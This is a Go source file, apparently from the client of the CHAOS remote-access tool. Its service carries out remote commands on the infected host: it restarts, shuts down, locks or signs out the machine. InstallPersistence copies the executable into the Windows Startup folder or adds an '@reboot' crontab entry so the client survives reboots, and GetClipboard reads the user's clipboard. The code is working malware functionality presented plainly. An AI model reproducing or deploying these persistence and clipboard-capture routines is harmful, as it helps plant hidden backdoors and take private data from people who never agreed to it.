package os

import (
	"fmt"
	"os"
	"path/filepath"
	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"github.com/tiagorlampert/CHAOS/client/app/services"
)

type OperatingSystemService struct {
	Configuration *environment.Configuration
	Terminal      services.Terminal
	OSType        OSType
}

func NewService(
	configuration *environment.Configuration,
	terminal services.Terminal,
	osType OSType,
) services.OS {
	return &OperatingSystemService{
		Configuration: configuration,
		Terminal:      terminal,
		OSType:        osType,
	}
}

func (s OperatingSystemService) Restart() error {
	switch s.OSType {
	case Windows:
		s.Terminal.Run("shutdown -r -t 00")
	case Linux:
		s.Terminal.Run("reboot")
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}

func (s OperatingSystemService) Shutdown() error {
	switch s.OSType {
	case Windows:
		s.Terminal.Run("shutdown -s -t 00")
		break
	case Linux:
		s.Terminal.Run("poweroff")
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}

func (s OperatingSystemService) Lock() error {
	switch s.OSType {
	case Windows:
		s.Terminal.Run("Rundll32.exe user32.dll,LockWorkStation")
		break
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}

func (s OperatingSystemService) SignOut() error {
	switch s.OSType {
	case Windows:
		s.Terminal.Run("shutdown -L")
		break
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}

func (s OperatingSystemService) InstallPersistence() error {
	switch s.OSType {
	case Windows:
		exe, err := os.Executable()
		if err != nil {
			return err
		}
		startup := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + filepath.Base(exe)
		_, err = s.Terminal.Run(fmt.Sprintf("copy \"%s\" \"%s\"", exe, startup))
		return err
	case Linux:
		exe, err := os.Executable()
		if err != nil {
			return err
		}
		_, err = s.Terminal.Run(fmt.Sprintf("(crontab -l ; echo \"@reboot %s\") | crontab -", exe))
		return err
	default:
		return services.ErrUnsupportedPlatform
	}
}

func (s OperatingSystemService) GetClipboard() (string, error) {
	switch s.OSType {
	case Windows:
		out, err := s.Terminal.Run("powershell -command \"Get-Clipboard\"")
		return string(out), err
	case Linux:
		out, err := s.Terminal.Run("xclip -o -selection clipboard")
		return string(out), err
	default:
		return "", services.ErrUnsupportedPlatform
	}
}
